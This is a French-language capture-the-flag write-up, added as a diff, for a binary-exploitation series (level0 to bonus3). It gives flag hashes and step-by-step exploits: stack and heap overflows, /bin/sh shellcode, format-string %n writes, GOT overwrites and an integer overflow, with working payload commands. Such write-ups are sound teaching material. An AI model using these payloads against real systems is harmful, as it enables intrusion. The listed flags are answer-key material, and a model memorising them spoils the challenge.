@@ -1,0 +1,218 @@
+0 : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+Quand on lance lvl0 sans rien ça segfault, si on le lance avec un truc il affiche "No!".
+On lance gdb et on break sur le main. On remarque un appel à atoi avec la string qu'on passe en argument suivi d'une comparaison avec son retour et 0x1a7 en hex ou 423 en decimal.
+Suffit donc de passer en argument 423 pour qu'un shell s'ouvre et qu'on ai accès au pass du lvl1.
+
+
+1 : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+Si on lance lvl1, il nous demande quelque chose sur l'entrée standard.
+Quand on lance objdump -d sur lvl1, on voit la fonction run qui execute un system (on suppose que cette fonction execute un shell). Cette fonction n'est pas appelée par le main.
+Si on observe le main, on peut voir qu'il utilise un buffer pour gets.
+On va sur ce site : http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+Ca permet de trouver l'offset pour le buffer overflow.
+On crée une string et on l'envoie sur lvl1 avec gdb.
+Gdb nous renvoie une adresse qu'on rentre sur le site dans "EIP Value" et le site va nous sortir l'offset 76.
+On récupère l'addresse de run, 0x08048444, et on la reverse à cause du little endian, ce qui donne 0x44840408.
+Avec ces infos, on crée le fichier /tmp/flag qui contient : python -c 'print "a"*76+"\x44\x84\x04\x08"'
+On execute ensuite la commande : cat /tmp/flag - | ./level1
+Le - sert à garder le shell ouvert.
+On fait la commande : cd ../level2 && cat .pass
+
+
+2 : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+Ce level ressemble au précédent sauf que cette fois, il faut faire en sorte de rediriger le programme vers notre exploit.
+Pour chaque fonction appelée, dans ce cas p, l'instruction ret contient une addresse pour revenir à la fonction appelante, dans ce cas main. On peut donc remplacer cette addresse par celle de notre exploit grâce à un buffer overflow.
+Si on désassemble le binaire, on remarque cette ligne qui correspond à une allocation de mémoire de 76 octets :
+lea -0x4c(%ebp),%eax
+On suppose qu'il s'agit du buffer où le programme stockera le retour du gets.
+On utilise le shellcode suivant pour ouvrir un shell :
+"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+On stocke ce shellcode dans une variable d'environnement SHELLCODE :
+export SHELLCODE=$(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+Puisque les données sont stockées comme ci-dessous en mémoire, on va essayer de jump directement sur le ret qui va nous renvoyer sur l'addresse de notre exploit :
+buffer | ebp | ret
+L'instruction \x90 permet d'avancer vers l'instruction suivante, on va donc l'utiliser 44 fois pour jump sur le ret.
+Ensuite on ajoute une dizaine de fois l'addresse du ret 0x0804853e et enfin l'addresse de l'exploit.
+Pour récupérer l'addresse de l'exploit, on se sert de la fonction getenv et on ajoute à l'addresse qui est renvoyée la taille de argv[0] et la taille de ./level2 puisque ces 2 derniers paramètres auront un impact sur l'emplacement des variables suivantes.
+On obtient donc la commande suivante qu'on redirige vers /tmp/flag :
+python -c 'print "\x90" * 44 + "\x3e\x85\x04\x08" * 10 + "\xef\xf8\xff\xbf"'
+On execute ensuite la commande : cat /tmp/flag - | ./level2
+Le - sert à garder le shell ouvert.
+On fait la commande : cd ../level3 && cat .pass
+
+
+3 : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+On a un executable level3 qui nous demande un input et print ce qu'on a tapé.
+Si on fait un objdump dessus, on remarque que pour print ce qu'on a tapé, le programme utilise un printf puis fait une comparaison avec 0x40.
+On peut donc faire un "format string overflow", c'est-à-dire qu'avec les bons paramètres envoyés au printf, on peut accéder et modifier le contenu d'adresses mémoire.
+En utilisant gdb, on remarque que la comparaison avec 0x40 se fait avec la variable m, on doit donc la faire valoir 0x40 pour que la comparaison soit vraie.
+En envoyant %x au printf, ce dernier considère cet argument comme une adresse de quatre octets et écrit en notation hexadécimale ce qu'il trouve sur la pile.
+En envoyant %n au printf, cela nous permet d'écrire dans une région de la mémoire.
+Si on envoie "AAAA-%x-%x-%x-%x-%x" au programme, il nous renvoie "AAAA-200-b7fd1ac0-b7ff37d0-41414141-2d78252d", on remarque qu'il nous a print 41414141, ce qui correspond à AAAAAA en ascii, c'est donc sur le 4ème argument qu'on va placer %n pour pouvoir modifier m.
+On peut utiliser le raccourci %4$x pour lire et modifier seulement le 4ème argument à la place des 4 '%x'.
+On peut donc récupérer l'addresse de m et la mettre à la place de AAAA, ce qui nous donne "\x8c\x98\x04\x08-%4$x"
+Puisqu'on veut modifier ce qu'il y a dans cette addresse et non pas la récupérer on remplace %4$x par %4$n, ce qui nous donne "\x8c\x98\x04\x08-%4$n".
+Si on envoie cet input au programme et qu'on voit la valeur de m, on remarque qu'elle vaut 5, ce qui correspond au nombre d'octets de l'adresse, 4, plus 1 pour l'argument.
+Pour obtenir 0x40 donc 64 en décimal, il faut écrire 64 - 4 = 60 caractères, on utilise donc le spécificateur %60x, ce qui nous donne l'input suivant :
+"\x8c\x98\x04\x08%60x%60$n"
+Comme pour le niveau précédent, on redirige cet input vers un fichier dans /tmp et on execute la commande suivante :
+cat /tmp/flag - | ./level3
+Et enfin : cd ../level4 && cat .pass
+
+
+4 : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+Ce niveau ressemble au précédent à l'exception près que la comparaison est faite avec un nombre plus grand 0x1025544 et que la place de l'argument à modifier dans le printf n'est pas la même, 12.
+On récupère l'adresse de m avec readelf et on va écrire 0x1025544 de l'adresse de m à l'adresse de m + 4.
+Du coup, on obtient cet input : "\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08"
+Ensuite, on écrit le nombre de caractères qu'il manque pour atteindre chaque octet de 0x1025544, ce qui nous donne :
+0x44 - 16 = 52
+0x55 - 0x44 = 17
+0x02 - 0x55 = impossible
+
+Dans ce cas, on recommence avec 0x301, 0x202, 0x155 et 0x44, ce qui nous donne :
+0x44 - 16 = 52
+0x155 - 0x44 = 273
+0x202 - 0x155 = 173
+0x301 - 0x202 = 255
+
+On obtient donc l'input suivant :
+"\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08%52x%12$n%273x%13$n%173x%14$n%255x%15$n"
+On envoie cet input au programme et il nous renvoie le pass.
+
+
+5 : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+Ce niveau ressemble également au précédent, sauf que cette fois on veut accéder à une fonction qui n'est jamais appelée dans le code.
+On va pour cela utiliser la GOT, qui est l'endroit de la mémoire où se trouvent les adresses des fonctions linkées pour remplacer l'adresse de la fonction exit appelée juste après le printf par l'adresse de la fonction qu'on veut appeler (o).
+Pour ça, avec objdump -R, on récupère l'adresse de exit et avec objdump -d, celle de o.
+On applique la même méthode qu'au niveau précédent avec les soustractions :
+0xa4 - 16 = 148
+0x184 - 0xa4 = 224
+0x204 - 0x184 = 128
+0x308 - 0x204 = 260
+Ce qui nous donne l'input suivant :
+"\x38\x98\x04\x08\x39\x98\x04\x08\x3a\x98\x04\x08\x3b\x98\x04\x08%148x%4$n%224x%5$n%128x%6$n%260x%7$n"
+On l'envoie au programme et on affiche le pass avec :
+cd ../level6 && cat .pass
+
+
+6 : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+Dans ce niveau, on trouve un executable level6 qui demande un argument.
+Si on observe le code avec objdump, on remarque 2 fonctions, m et n.
+On remarque aussi 2 malloc, ainsi que l'adresse de m qui est copiee dans le 2eme malloc puis appelee.
+La fonction n contient un system et n'est jamais appelee, on va donc l'appeler en remplacant le contenu du 2eme malloc par l'adresse de n.
+Pour cela, avec gdb, on trouve les adresses des 2 malloc et on fait la difference entre les 2, ce qui nous donne 72.
+On va donc ecrire 72 caracteres, puis l'adresse de n, ce qui nous donne la commande suivante :
+./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')
+
+
+7 : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+Le désassemblage du programme nous indique qu'il contient une fonction m qui n'est jamais appelée.
+Une lecture du main nous permet de comprendre que le fichier .pass de level8 est lu et mis dans la variable c et cette fameuse fonction m fait un printf de cette variable.
+On voit que 2 mallocs sont effectués et que les adresses sont mis dans des variables.
+Les 2 strcpy ensuite nous permettront d'écraser l'adresse qui est obtenue via le 2e malloc.
+On regarde d'abord la distance qu'il y a entre les 2 adresses retournées par le 2e et le 3e malloc et on trouve 16 octets.
+On doit donc écrire grâce à notre 1er argument 16 octets + 4 octets pour arriver à l'index 1 et insérer l'adresse que l'on veut mettre dans la variable qui contient l'adresse du 4e malloc.
+On y met l'adresse de puts sur la GOT car il est appelé juste après que le flag soit mis dans c.
+Le 2e strcpy nous permet de mettre l'adresse de la function m qui sera appelée à la place de puts.
+On lance level7 ainsi:
+./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08 \xf4\x84\x04\x08"')
+
+array1 = [malloc1]{[0][malloc2]}
+array2 = [malloc3]{[0][malloc4]}
+
+strcpy(*array1[1], av[1])
+strcpy(*array2[1], av[2])
+
+
+8 : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+Si on traduit ce programme en C, on remarque qu'un system("/bin/sh") est executé si la variable auth contient quelque chose et qu'on a entré "login".
+On remarque aussi que si on entre "auth ", le programme alloue de la mémoire à la variable auth.
+Si on entre "service", le programme va copié ce qu'on a entré à partir du 7ème octet et le placer dans la variable service.
+En sachant tout ça, si on écrit "auth " pour allouer de la mémoire à la variable auth, puis "service" et un nombre arbitraire très grand de caractères à la suite pour écrire dans auth par overflow et enfin, si on écrit "login", on obtient un shell qui nous permet d'obtenir le mot de passe grâce à la commande suivante :
+cd ../level9 && cat .pass
+
+
+9 : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+Quand on desassemble ce programme, on remarque qu'il demande un argument.
+Cet argument est stocké dans un buffer de 104 octets par le biais d'un memcpy.
+De plus, on remarque un appel à la surcharge d'operateur + avec 2 pointeurs déréférencés.
+Toutes ces informations nous permettent d'écraser l'appel à la surcharge d'opérateur + avec l'adresse du shellcode suivant :
+\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+Pour cela, on récupère l'adresse du pointeur qui est utilisé pour appeler la fonction et le nombre d'octets qui séparent le buffer de ce pointeur c'est-à-dire 112.
+De ce nombre d'octets on retire le nombre d'octets que compose notre shellcode ainsi que l'adresse du pointeur ce qui nous donne 84.
+Comme le pointeur attend une adresse, on va décaler le shellcode de 4 octets, placer l'adresse du shellcode avant ce dernier et retirer 4 octets de notre padding, ce qui nous donne 80.
+Ce qui donne la string suivante :
+"\x10\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 80 + "\x0c\xa0\x04\x08"
+L'adresse du shellcode suivi du shellcode suivi du padding de 80 et enfin l'adresse du buffer.
+La commande suivante nous ouvre donc un shell :
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 80 + "\x0c\xa0\x04\x08"')
+Ce qui nous permet d'obtenir le mot de passe grâce à la commande suivante :
+cd ../bonus0 && cat .pass
+
+
+bonus0 : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+Quand on desassemble ce programme, on remarque qu'il nous demande 2 entrées, de 4096 octets maximum puis remplace le '\n' par une '\0' et copie dans un buffer de 20 octets.
+Ensuite il copie le 1er buffer dans le buffer du main, cherche un '\0' dans ce dernier buffer, le remplace par un ' ' et ajoute un '\0'.
+Enfin il concatène le buffer du main avec le 2ème buffer.
+Du coup si on entre plus de 20 octets pour la première entrée, le 1er buffer se retrouve sans '\0'.
+Ensuite quand il va chercher le '\0' pour mettre l'espace, il ira chercher celui du 2ème buffer.
+Et quand la concatènation se fera, le programme concatènera le 1er buffer + le 2ème buffer + ' ' avec le 2ème buffer.   
+On peut donc mettre un shellcode dans une variable d'environnement et récupérer son adresse avec getenv.
+Pour pouvoir envoyer 2 entrées sur l'entrée standard, il faut que le buffer du read (4096) se remplisse pour qu'il s'execute a nouveau et qu'il lise la 2ème entrée.
+Donc on va lui envoyer 4095 octets et un '\n' pour passer à la 2ème entrée.
+Pour la 2ème entrée, on doit envoyer 20 octets pour remplir le 2ème buffer.
+On veut lui envoyer l'adresse du shellcode et un '\n' donc on fait 20-4-1, ce qui nous donne 15 octets.
+Ce qui nous donne l'input suivant :
+print "0"*4095 + "\n" + "0"*15 + "\xe7\xf8\xff\xbf"
+Si on execute cet input avec gdb, on remarque qu'un octet et manquant sur l'adresse sur laquelle le programme crash, on va donc ajouter un octet à la fin de l'input et retirer un octet des 15 octets juste avant l'adresse du shellcode, ce qui nous donne cet input final :
+print "0"*4095 + "\n" + "0"*14 + "\xe7\xf8\xff\xbf"
+On a plus qu'à stocker cet input dans un fichier, lancer le programme en pipant le fichier avec - pour qu'il reste ouvert et executer la commande suivante pour récupérer le mot de passe :
+cd ../bonus1 && cat .pass
+
+
+bonus1 : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+Quand on desassemble ce programme, on remarque qu'il prend av[1], le met dans un buffer, le convertit en nombre avec un atoi et le stocke dans un int.
+Ensuite, il verifie si ce int est inférieur ou égal à 9, si oui alors il copie avec memcpy ce int*4 octets de av[2] dans le buffer.
+Enfin, si le int est égal à 0x574f4c46 alors il ouvre un shell.
+Le challenge était donc de faire en sorte que av[1] soit inférieur à 9, mais qu'après le memcpy, av[1] soit égal à 0x574f4c46 pour pouvoir ouvrir le shell.
+Pour cela, il faut écraser la valeur du int avec le memcpy en faisant un overflow du buffer dans lequel on va copier.
+Mais en faisant juste ça, il nous reste un problème, on ne pourra pas copier plus de 36 (9*4) octets dans le buffer, du coup pas d'overflow possible.
+Sauf dans le cas où on envoie un nombre négatif suffisamment grand pour que quand on le multiplie par 4 dans le memcpy, il dépasse la valeur maximum d'un int, qu'il passe en positif et que, du coup, on copie plus de 36 octets.
+De plus, il faut faire attention à ce que ce nombre négatif ne soit pas inférieur à la valeur minimum d'un int, sinon le atoi la convertit en 0.
+Un nombre négatif est composé de 8 octets et un int est composé de 4 octets, donc on va modifier les 4 derniers octets de notre nombre négatif pour que quand il sera multiplié par 4, on ai exactement le nombre d'octets que l'on veut copier.
+Pour trouver ce nombre, on va prendre la valeur minimum d'un int (-2147483648) en hexadécimal (FFFF FFFF 8000 0000) et la multiplier par 4, ce qui nous donne FFFF FFFE 0000 0000.
+Pour trouver le nombre d'octets qu'on veut copier, il faut utiliser gdb et aller après le memcpy.
+A partir de là, on récupère la difference entre l'adresse de esp+0x3c+4 (ce qu'on veut comparer + 4 octets pour 0x574f4c46) et l'adresse du retour du memcpy, ce qui nous donne 44 octets.
+On convertit 44 en hexa et on remplace le dernier octet de notre nombre par cette valeur, ce qui nous donne : FFFF FFFE 0000 002C
+On divise finalement cette valeur par 4 pour avoir une valeur supérieure à la valeur minimum d'un int : FFFF FFFF 8000 000B (-2147483637)
+Pour le 2ème argument, suffit d'envoyer 40 octets ainsi que 0x574f4c46 inversée à cause du little endian et on a notre commande finale :
+./bonus1 -2147483637 $(python -c 'print "0"*40 + "\x46\x4c\x4f\x57"')
+Enfin, on va dans le dossier ../bonus2 et on affiche le mot de passe avec cat .pass
+
+
+bonus2 : 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+Quand on desassemble ce progamme, on remarque qu'une variable d'environnement LANG est utilisée.
+Selon les cas, "fi", "nl" ou rien, alors la string "Hyvää päivää ", "Goedemiddag! ", ou "Hello " sera placée dans un buffer (appelons-le buf_hello).
+Ce programme va récupérer les 2 arguments qu'on lui passe et va les mettre à la suite dans un buffer, puis va concaténer buf_hello avec le buffer contenant les 2 arguments et écrire le retour de la concaténation.
+Si on lui envoie test et test2 et qu'on ne crée pas de variable d'environnement LANG, alors, il va nous écrire :
+Hello test
+L'objectif va être d'overflow buf_hello pour executer un shellcode qu'on a placé dans une variable d'environnement.
+Pour cela on va déjà commencer par remplir buf_hello, on lui envoie donc 40 octets puis 32 octets.
+Pour executer le shellcode, il faut que celui-ci soit placé dans eip, du coup on va ajouter 4 octets au 2ème argument pour la sauvegarde de ebp qui se situe entre le buffer et eip, ce qui nous fait 36 octets.
+On va ensuite mettre la variable LANG à "nl" pour qu'on ai la string "Goedemiddag! " qui fait 13 octets.
+Pour avoir notre argument final, il faut donc soustraire ces 13 octets aux 36 du dessus, ce qui nous donne 23 octets, on va donc envoyer 23 octets suivi de l'adresse de notre shellcode.
+Dans l'adresse du shellcode, il ne faut pas oublier :
+804852c:       57                      push   edi
+804852d:       56                      push   esi
+804852e:       53                      push   ebx
+On va donc ajouter 3 octets à cette adresse, ce qui nous donne ces 2 arguments :
+$(python -c 'print "1"*40') $(python -c 'print "2"*23 + "\xf3\xf8\xff\xbf"')
+On envoie ces arguments au programme, il nous ouvre un shell dans lequel on peut taper la commande suivante pour récupérer le mot de passe :
+cd ../bonus3 && cat .pass
+
+
+bonus3 : 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+Quand on desassemble ce progamme, on remarque qu'il ouvre un shell si ce qu'on entre en 1er argument est égal à "\0", du coup on lui envoie l'argument suivant :
+./bonus3 ""
+il nous ouvre un shell dans lequel on peut taper la commande suivante pour récupérer le mot de passe :
+cd ../end && cat .pass
